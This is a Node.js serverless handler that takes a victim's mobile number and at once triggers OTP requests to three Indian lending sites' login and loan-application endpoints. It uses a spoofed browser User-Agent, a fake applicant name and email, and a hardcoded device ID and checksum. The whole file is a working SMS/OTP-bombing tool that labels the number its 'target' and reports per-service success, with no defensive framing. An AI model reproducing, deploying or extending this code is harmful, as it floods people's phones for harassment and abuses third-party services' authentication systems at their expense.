const axios = require('axios');

export default async function handler(req, res) {
    // Get the mobile number from the query string (?mob=...)
    const { mob } = req.query;

    if (!mob || mob.length < 10) {
        return res.status(400).json({ error: "Please provide a valid 10-digit mobile number." });
    }

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    };

    // Define the 3 API tasks
    const tasks = [
        // 1. Avanse
        axios.post('https://www.avanse.com/common-loan-apply/otp', 
            new URLSearchParams({
                'contactNumber': mob,
                'pageUrl': 'New Student Loan',
                'name': 'Ckv Jvn',
                'emailId': 'newuser.comop@gmail.com'
            }).toString(), { headers, timeout: 5000 }).catch(e => ({ status: 'failed' })),

        // 2. BrightLoans
        axios.post('https://brightloans.in/login-sbm', 
            new URLSearchParams({
                'mobile': mob,
                'current_page': 'login',
                'device_id': '3c2f1fb977b9f389dc7e60f5f3fa9c44'
            }).toString(), { headers, timeout: 5000 }).catch(e => ({ status: 'failed' })),

        // 3. Stashfin
        axios.post('https://api.stashfin.com/v2/api/', 
            new URLSearchParams({
                'phone': mob,
                'mode': 'generate_otp',
                'checksum': 'f5d551b1531459cf6eee963f0476fc7b6079d9dd01a46e33beb7677d5e021e3c'
            }).toString(), { headers, timeout: 5000 }).catch(e => ({ status: 'failed' }))
    ];

    try {
        // Run all three requests at the same time for maximum speed
        const responses = await Promise.all(tasks);

        res.status(200).json({
            success: true,
            target: mob,
            results: {
                avanse: responses[0].status || 'success',
                bright: responses[1].status || 'success',
                stashfin: responses[2].status || 'success'
            }
        });
    } catch (error) {
        res.status(500).json({ error: "Something went wrong with the execution." });
    }
}

